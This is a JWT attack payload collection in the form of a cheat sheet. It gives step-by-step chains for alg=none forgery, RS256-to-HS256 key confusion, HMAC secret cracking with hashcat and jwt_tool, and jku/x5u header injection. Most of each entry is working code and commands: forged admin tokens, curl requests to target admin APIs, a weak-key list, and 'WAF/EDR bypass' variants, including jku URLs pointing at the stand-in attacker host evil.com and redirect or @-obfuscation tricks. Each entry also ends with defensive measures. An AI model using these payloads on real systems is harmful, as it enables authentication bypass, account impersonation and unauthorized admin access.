# JWT Security

_4 web payloads_

### JWT None Algorithm Attack  `jwt-none-attack`
_Exploit the flaw in JWT libraries that support the "none" algorithm: change the signature algorithm in the JWT header to none and remove the signature, constructing a forged token that passes validation without any key. This is one of the most classic JWT vulnerabilities._
Subcategory: **Algorithm Attack** · tags: `JWT` `none algorithm` `Authentication Bypass` `Token Forgery` `CVE-2015-2951`

**Prerequisites:**
- Target uses JWT for identity authentication
- jwt_tool or the Python PyJWT library

**Attack Chain:**

**1. Decode an existing JWT**
> Parse the Header and Payload parts of the JWT, identifying the algorithm and claim content
```
# Decode the three parts of the JWT
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature" | cut -d. -f1 | base64 -d
# Output: {"alg":"HS256","typ":"JWT"}

echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature" | cut -d. -f2 | base64 -d
# Output: {"user":"guest","role":"user"}
```
**Syntax breakdown:**
- `cut -d. -f1` — split by the dot and take the first segment (Header) _command_
- `base64 -d` — Base64 decode _command_
- `"alg":"HS256"` — currently using HMAC-SHA256 signing _json_
- `"role":"user"` — user role claim — the attack target _json_

**2. Construct a None algorithm JWT**
> Python script to construct a forged JWT with alg=none, escalating privileges to admin
```
import base64, json

# Change the Header to the none algorithm
header = base64.urlsafe_b64encode(
    json.dumps({"alg":"none","typ":"JWT"}).encode()
).rstrip(b"=").decode()

# Change the Payload to admin
payload = base64.urlsafe_b64encode(
    json.dumps({"user":"admin","role":"admin"}).encode()
).rstrip(b"=").decode()

# Empty signature
forged_jwt = f"{header}.{payload}."
print(forged_jwt)
```
**Syntax breakdown:**
- `"alg":"none"` — set the signature algorithm to none (no signature) _json_
- `"role":"admin"` — tamper the role to administrator _json_
- `urlsafe_b64encode` — URL-safe Base64 encoding _function_
- `rstrip(b"=")` — remove the Base64 padding characters _function_

**3. Automated attack with jwt_tool**
> Use jwt_tool to automatically test the none algorithm and its case variants
```
python3 jwt_tool.py {TOKEN} -X a

# -X a = attempt the none algorithm attack
# Also tests multiple none variants
# none, None, NONE, nOnE, noNe
```
**Syntax breakdown:**
- `jwt_tool.py` — JWT security testing tool _command_
- `-X a` — enable the alg:none attack mode _parameter_
- `none variants` — test case-based bypasses such as None/NONE/nOnE _concept_

**4. Verify the forged token**
> Use the forged JWT to access an admin interface and verify the attack effect
```
curl -s -H "Authorization: Bearer {FORGED_JWT}" \
  "https://{TARGET}/api/admin/dashboard"

# Check whether admin privileges were obtained
# 200 OK = attack succeeded
# 401/403 = the server correctly rejected the none algorithm
```
**Syntax breakdown:**
- `Bearer {FORGED_JWT}` — use the forged JWT token _header_
- `/api/admin/dashboard` — admin-only interface _path_

**WAF/EDR Bypass Variants:**

**none algorithm case variants**
> Use various case combinations of none and different signature placeholders to bypass validation
```
# Various none variants
{"alg":"none"}
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
{"alg":"noNe"}
{"alg":"nONE"}

# Add a signature placeholder
header.payload.
header.payload.AA==
header.payload.e30=
```
**Syntax breakdown:**
- `nOnE/noNe` — mixed case to bypass string comparison _encoding_
- `.AA==` — a non-empty signature placeholder may bypass empty-signature detection _technique_

**Overview:** The JWT None algorithm attack (CVE-2015-2951) is the most classic vulnerability in JWT security. The JWT specification defines the "none" algorithm to indicate no signature verification is required, originally intended for scenarios where integrity is guaranteed by other means (such as TLS). However, many JWT libraries accept the client-specified algorithm during validation. When an attacker changes the alg in the header to none and removes the signature, the server skips signature verification and directly trusts the Payload content.

**Vulnerability Principle:** Root causes: (1) JWT libraries support the none algorithm by default and it is not explicitly disabled at the application layer; (2) the validation logic uses the client-specified alg field in the header rather than the server-configured algorithm; (3) some libraries perform case-sensitive matching on none but can be bypassed with variants such as None/NONE; (4) the signature verification logic returns true directly when the signature is empty. This affects all applications using an affected JWT library, and an attacker can forge any identity.

**Exploitation Method:** Exploitation steps: (1) obtain a valid JWT (e.g. register an ordinary account); (2) Base64-decode the Header and Payload; (3) change the alg field of the header to none; (4) modify the user information in the Payload (e.g. change role to admin); (5) re-Base64-encode and concatenate as header.payload. (empty signature); (6) use the forged JWT to access a high-privilege interface. It is recommended to use jwt_tool -X a to automatically test all none variants.

**Defensive Measures:** Remediation: (1) hardcode an allowlist of permitted signature algorithms on the server and explicitly disable none; (2) use the server-configured algorithm during validation rather than the alg in the JWT header; (3) upgrade the JWT library to the latest version (modern libraries reject none by default); (4) implement a JWT signing key rotation mechanism; (5) add JWT token blacklisting to support logout/revocation.

---

### JWT Key Confusion Attack (RS→HS)  `jwt-key-confusion`
_When the server uses an RSA public key to verify a JWT, an attacker changes the algorithm from RS256 to HS256. At this point, the server mistakenly uses the RSA public key as the HMAC key for verification. Since the RSA public key is public, the attacker can use it to sign an arbitrary JWT._
Subcategory: **Algorithm Attack** · tags: `JWT` `Key Confusion` `RS256` `HS256` `Algorithm Tampering`

**Prerequisites:**
- The target JWT uses the RS256/RS384/RS512 algorithm
- The RSA public key has been obtained
- jwt_tool or Python

**Attack Chain:**

**1. Obtain the RSA public key**
> Obtain the RSA public key from a JWKS endpoint, API, or SSL certificate
```
# Common public key leakage locations
curl -s "https://{TARGET}/.well-known/jwks.json" | jq
curl -s "https://{TARGET}/api/keys" | jq
curl -s "https://{TARGET}/oauth/discovery" | jq

# Extract the public key from JWKS
# Or obtain it from the SSL certificate
openssl s_client -connect {TARGET}:443 | openssl x509 -pubkey -noout > pubkey.pem
```
**Syntax breakdown:**
- `/.well-known/jwks.json` — standard JWKS public key publication endpoint _path_
- `jq` — JSON formatting tool _command_
- `openssl x509 -pubkey` — extract the public key from an X.509 certificate _command_

**2. Key confusion attack**
> Python script using the RSA public key as the HMAC key to sign a forged JWT
```
import jwt
import json

# Read the RSA public key
with open("pubkey.pem", "rb") as f:
    public_key = f.read()

# Sign with the public key as the HMAC key
forged_payload = {
    "user": "admin",
    "role": "admin",
    "iat": 1707811200,
    "exp": 1999999999
}

# Switch the algorithm from RS256 to HS256
forged_token = jwt.encode(
    forged_payload,
    public_key,        # RSA public key as the HMAC key
    algorithm="HS256"  # Change to the HMAC algorithm
)
print(forged_token)
```
**Syntax breakdown:**
- `jwt.encode` — PyJWT encoding function _function_
- `public_key` — the RSA public key is mistakenly used as the HMAC key _variable_
- `algorithm="HS256"` — change the algorithm from RS256 to HS256 _parameter_
- `"exp": 1999999999` — set an extremely distant expiration time _json_

**3. Automated attack with jwt_tool**
> jwt_tool executes the key confusion attack in one command
```
python3 jwt_tool.py {TOKEN} -X k -pk pubkey.pem

# -X k = key confusion attack mode
# -pk = specify the public key file
# The tool automatically completes the RS256→HS256 switch and signing
```
**Syntax breakdown:**
- `-X k` — enable the Key Confusion attack mode _parameter_
- `-pk pubkey.pem` — specify the RSA public key file path _parameter_

**4. JWKS endpoint injection**
> JKU/X5U header injection makes the server fetch the verification key from an attacker-controlled URL
```
# If the jku/x5u header is supported, a custom JWKS endpoint can be injected
Header: {
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://evil.com/.well-known/jwks.json"
}

# Host an attacker-generated JWKS on evil.com
# The server will fetch the public key from the attacker's URL for verification
openssl genrsa -out attacker_key.pem 2048
openssl rsa -in attacker_key.pem -pubout > attacker_pub.pem
```
**Syntax breakdown:**
- `"jku"` — JWK Set URL — specifies the public key source _header_
- `evil.com` — attacker-controlled key hosting server _domain_
- `openssl genrsa` — generate the attacker's own RSA key pair _command_

**WAF/EDR Bypass Variants:**

**Try multiple public key formats**
> Some JWT libraries handle public key formats differently; try multiple formats
```
# PEM format (standard)
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqh...
-----END PUBLIC KEY-----

# DER format (binary)
openssl rsa -pubin -in pubkey.pem -outform DER -out pubkey.der

# With/without newlines
cat pubkey.pem | tr -d "\n" > pubkey_noline.pem

# Public keys in different encodings used as the HMAC key
```
**Syntax breakdown:**
- `PEM/DER` — the two main public key encoding formats _format_
- `tr -d "\n"` — remove newlines (single-line public key) _command_

**Overview:** The JWT Key Confusion attack (Algorithm Confusion) exploits the flaw where JWT libraries trust the alg field in the header when verifying signatures. When the server is configured for the RS256 (asymmetric) algorithm, an attacker changes the alg to HS256 (symmetric), at which point the server attempts to use the RSA public key as the HMAC key to verify the signature. Since the RSA public key is public, the attacker can use it to compute a valid HMAC signature.

**Vulnerability Principle:** Vulnerability chain: (1) the server uses RS256 to verify the JWT, signing with the RSA private key and verifying with the public key; (2) the RSA public key can usually be obtained from /.well-known/jwks.json or the certificate; (3) the attacker changes the alg in the JWT header to HS256; (4) the server verification logic uses the alg in the header to determine the verification method; (5) HS256 is a symmetric algorithm, and during verification it performs HMAC with the "key" — here the "key" is the RSA public key. The root cause is that the algorithm choice is on the client rather than the server.

**Exploitation Method:** Exploitation steps: (1) confirm the target JWT uses RS256/RS384/RS512; (2) obtain the RSA public key from the JWKS endpoint, OAuth Discovery, SSL certificate, etc.; (3) change the alg of the JWT header to HS256; (4) use the obtained RSA public key as the HMAC key to sign the modified JWT; (5) note the public key format — a PEM, DER, or newline-stripped version may be required. The jwt_tool -X k command can complete this in one step. Older versions of PyJWT allowed this attack by default; newer versions have fixed it.

**Defensive Measures:** Defenses: (1) hardcode a list of permitted algorithms on the server and do not use the alg in the header during validation; (2) use a type-safe validation function (e.g. specify algorithms=["RS256"]); (3) upgrade the JWT library to the latest version; (4) if using JWKS, restrict fetching keys to only trusted URLs and prohibit jku/x5u redirects; (5) rotate signing keys regularly.

---

### JWT Secret Brute Force  `jwt-secret-bruteforce`
_When a JWT uses an HMAC symmetric algorithm (HS256/HS384/HS512) and the key is a weak password, the signing key can be recovered via a dictionary or brute-force attack, and thereby an arbitrary JWT token can be forged._
Subcategory: **Key Cracking** · tags: `JWT` `Secret Brute Force` `HS256` `Weak Key` `hashcat`

**Prerequisites:**
- The target JWT uses an HMAC algorithm (HS256, etc.)
- A valid JWT sample has been obtained
- hashcat or jwt_tool

**Attack Chain:**

**1. Confirm the algorithm and structure**
> Confirm the JWT uses an HMAC symmetric algorithm; the key of such algorithms can be brute-forced
```
# Decode the JWT Header
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
# {"alg":"HS256"}

# Confirm it is an HMAC symmetric algorithm to be brute-forceable
# HS256 / HS384 / HS512 = brute-forceable
# RS256 / ES256 = the key cannot be directly brute-forced
```
**Syntax breakdown:**
- `"alg":"HS256"` — HMAC-SHA256 — a symmetric algorithm, brute-forceable _json_
- `base64 -d` — decode the JWT Header _command_

**2. hashcat GPU-accelerated brute force**
> hashcat GPU-accelerated cracking of the JWT HMAC key
```
# hashcat mode 16500 = JWT
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt

# jwt.txt content is the complete JWT string
# eyJhbGci....signature

# Use rules to accelerate
hashcat -m 16500 -a 0 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask brute force (8-digit numeric key)
hashcat -m 16500 -a 3 jwt.txt ?d?d?d?d?d?d?d?d
```
**Syntax breakdown:**
- `-m 16500` — hashcat JWT mode _parameter_
- `-a 0` — dictionary attack mode _parameter_
- `-a 3` — brute-force/mask attack mode _parameter_
- `?d` — numeric mask placeholder (0-9) _format_
- `rockyou.txt` — common password dictionary _path_

**3. jwt_tool dictionary brute force**
> jwt_tool dictionary mode to crack the JWT key
```
python3 jwt_tool.py {TOKEN} -C -d /usr/share/wordlists/rockyou.txt

# -C = enable dictionary cracking mode
# -d = specify the dictionary file
# Also supports quick testing of common weak keys
python3 jwt_tool.py {TOKEN} -C -d common_jwt_secrets.txt
```
**Syntax breakdown:**
- `-C` — enable Crack mode (key brute force) _parameter_
- `-d` — specify the password dictionary path _parameter_

**4. Forge a JWT with the cracked key**
> Use the cracked key to sign a forged admin JWT
```
import jwt

secret = "cracked_secret_key"

forged = jwt.encode(
    {"user": "admin", "role": "superadmin", "exp": 1999999999},
    secret,
    algorithm="HS256"
)
print(f"Forged JWT: {forged}")

# Verify
curl -H "Authorization: Bearer $FORGED_JWT" "https://{TARGET}/api/admin"
```
**Syntax breakdown:**
- `"cracked_secret_key"` — the key obtained from brute-forcing _value_
- `jwt.encode` — re-sign using the cracked key _function_

**WAF/EDR Bypass Variants:**

**Common default JWT keys**
> Try common default/weak JWT keys first
```
# Common weak key list
secret
password
123456
hs256-secret
jwt-secret
my-secret-key
changeme
default
qwerty
super-secret
your-256-bit-secret
secretkey
token-secret
application-secret
```
**Syntax breakdown:**
- `your-256-bit-secret` — the jwt.io default example key _value_
- `changeme` — common default password _value_

**Overview:** JWT HMAC secret brute force is an attack against JWT systems using symmetric signing algorithms (HS256/HS384/HS512). Because HMAC algorithms use a shared key for signing and verification, if the key strength is insufficient (short password, common words, default value), an attacker can recover the key via a dictionary attack or brute force, then use that key to forge an arbitrary JWT token to impersonate an identity.

**Vulnerability Principle:** Vulnerability conditions: (1) the JWT uses an HMAC algorithm such as HS256; (2) the signing key is a weak password (e.g. secret, 123456, company name, etc.); (3) the key is not rotated regularly; (4) a default example key from tools such as jwt.io (your-256-bit-secret) is used in production. According to the JWT specification's recommendation, an HS256 key should be at least a 256-bit (32-byte) random value, but in practice many systems use short human-readable passwords. hashcat can test tens of billions of HS256 keys per second on a consumer-grade GPU.

**Exploitation Method:** Exploitation flow: (1) obtain a valid JWT sample from the login response or a cookie; (2) decode to confirm the use of the HS256/384/512 algorithm; (3) use hashcat -m 16500 with a large dictionary (rockyou.txt) for GPU-accelerated brute force; (4) or use jwt_tool -C -d to quickly test common weak keys; (5) after a successful crack, use the key to sign a JWT with an arbitrary Payload; (6) an RTX 4090 can run through the rockyou dictionary (14 million entries) within minutes.

**Defensive Measures:** Defenses: (1) use a cryptographically secure random key of at least 256 bits (openssl rand -hex 32); (2) prefer asymmetric algorithms (RS256/ES256) to avoid the key-sharing problem; (3) rotate JWT signing keys regularly; (4) prohibit using default/example keys in production; (5) enforce JWT expiration times (exp) and a blacklist mechanism to limit the impact of leaked tokens.

---

### JWT JKU/X5U Header Injection  `jwt-jku-x5u-injection`
_Exploit the jku (JWK Set URL) or x5u (X.509 URL) parameter in the JWT header to point the key source at an attacker-controlled server, making the server use the attacker's public key to verify the JWT, thereby achieving token forgery._
Subcategory: **Header Injection** · tags: `JWT` `JKU` `X5U` `Header Injection` `JWKS` `Key Hijacking`

**Prerequisites:**
- The target JWT supports the jku/x5u header parameter
- The attacker has a public-facing server
- Python environment

**Attack Chain:**

**1. Probe JKU/X5U support**
> Check whether the JWT uses the jku/x5u header and the target JWKS endpoint
```
# Decode the JWT Header to see whether it contains jku/x5u
echo "{JWT_HEADER}" | base64 -d | jq

# Common original header
{"alg":"RS256","typ":"JWT","jku":"https://target.com/.well-known/jwks.json"}

# Check the JWKS endpoint
curl -s "https://{TARGET}/.well-known/jwks.json" | jq
curl -s "https://{TARGET}/.well-known/openid-configuration" | jq .jwks_uri
```
**Syntax breakdown:**
- `"jku"` — JWK Set URL — points to the JWKS public key set _header_
- `.well-known/jwks.json` — OpenID Connect standard JWKS endpoint _path_
- `.jwks_uri` — the JWKS URL field in the OpenID configuration _json_

**2. Generate the attacker's key pair**
> Generate the attacker's RSA key pair and construct a JWKS file
```
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64

# Generate an RSA key pair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Export in PEM format
with open("attacker_private.pem", "wb") as f:
    f.write(private_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()
    ))

# Generate the public key in JWKS format
numbers = public_key.public_numbers()
jwks = {"keys": [{"kty": "RSA", "kid": "attacker-key-1",
    "n": base64.urlsafe_b64encode(numbers.n.to_bytes(256, "big")).rstrip(b"=").decode(),
    "e": base64.urlsafe_b64encode(numbers.e.to_bytes(3, "big")).rstrip(b"=").decode(),
    "use": "sig", "alg": "RS256"}]}

with open("jwks.json", "w") as f:
    json.dump(jwks, f)
```
**Syntax breakdown:**
- `rsa.generate_private_key` — generate a 2048-bit RSA key pair _function_
- `"kty": "RSA"` — JWKS key type _json_
- `"kid"` — Key ID — identifies the key _json_

**3. Host the JWKS and sign the JWT**
> Host the JWKS file and sign the JWT with the attacker's private key, with jku pointing to the attacker's server
```
# Host jwks.json on the attacker's server
python3 -m http.server 8080
# http://evil.com:8080/jwks.json

import jwt

# Sign with the attacker's private key
with open("attacker_private.pem", "rb") as f:
    attacker_key = f.read()

forged = jwt.encode(
    {"user": "admin", "role": "admin", "exp": 1999999999},
    attacker_key,
    algorithm="RS256",
    headers={"jku": "http://evil.com:8080/jwks.json", "kid": "attacker-key-1"}
)
print(forged)
```
**Syntax breakdown:**
- `python3 -m http.server` — quick HTTP file server _command_
- `"jku": "http://evil.com:8080/jwks.json"` — jku points to the attacker's JWKS _header_
- `"kid": "attacker-key-1"` — matches the kid in the JWKS _json_

**4. Verify the attack**
> Use the forged JWT with the injected jku to access an admin interface
```
curl -s -H "Authorization: Bearer {FORGED_JWT}" \
  "https://{TARGET}/api/admin/users" | jq

# Server flow:
# 1. Parse the jku URL in the JWT Header
# 2. Fetch the JWKS public key from evil.com
# 3. Verify the signature with the attacker's public key — passes!
# 4. Trust the admin identity in the Payload
```
**Syntax breakdown:**
- `{FORGED_JWT}` — the forged token containing the attacker's jku _variable_
- `/api/admin/users` — admin interface _path_

**WAF/EDR Bypass Variants:**

**JKU URL restriction bypass**
> Bypass the jku domain allowlist using open redirects, subdomain takeover, and URL obfuscation
```
# Open redirect to bypass the domain allowlist
{"jku": "https://target.com/redirect?url=https://evil.com/jwks.json"}

# Subdomain takeover
{"jku": "https://abandoned.target.com/.well-known/jwks.json"}

# URL obfuscation
{"jku": "https://target.com@evil.com/jwks.json"}
{"jku": "https://evil.com#target.com/jwks.json"}
{"jku": "https://evil.com/.well-known/jwks.json?.target.com"}
```
**Syntax breakdown:**
- `redirect?url=` — use an open redirect to jump to the attacker's domain _technique_
- `target.com@evil.com` — URL username obfuscation — actually accesses evil.com _technique_

**Overview:** JKU (JWK Set URL) and X5U (X.509 URL) are optional parameters in the JWT header used to specify the source URL of the signature verification key. If the server fetches the public key from the jku/x5u in the header during JWT verification without restricting the URL source, an attacker can point the parameter at a server they control, making the server use the attacker's public key to verify a JWT signed by the attacker, thereby achieving perfect token forgery.

**Vulnerability Principle:** Root causes: (1) the server trusts the URL specified by the jku/x5u parameter in the JWT header; (2) no URL allowlist or domain restriction is enforced; (3) even with domain validation, it may be bypassed via open redirects, subdomain takeover, and similar techniques; (4) some implementations even allow HTTP (non-HTTPS) jku URLs. An attacker can generate their own RSA key pair, sign the JWT with the private key, and host the corresponding JWKS public key file on the public internet.

**Exploitation Method:** Complete attack chain: (1) decode the target JWT to confirm it uses RS256 and has a jku field in the header; (2) generate the attacker's RSA key pair; (3) convert the public key to JWKS format and host it on the attacker's server; (4) modify the jku in the JWT header to point to the attacker's server; (5) sign the tampered Payload with the attacker's private key; (6) send the forged JWT — the server fetches the public key from the attacker's URL and verifies successfully. If there is a domain allowlist, use open redirects or subdomain takeover to bypass it.

**Defensive Measures:** Defenses: (1) disable the jku/x5u header parameters and hardcode the key source in the server configuration; (2) if jku must be used, enforce a strict URL allowlist and do not follow redirects; (3) pin the JWKS public key in the server configuration rather than fetching it dynamically; (4) enforce a mapping of kid to known keys and do not accept unknown kids; (5) regularly audit the JWT library configuration to ensure it does not trust a client-provided key source.

---
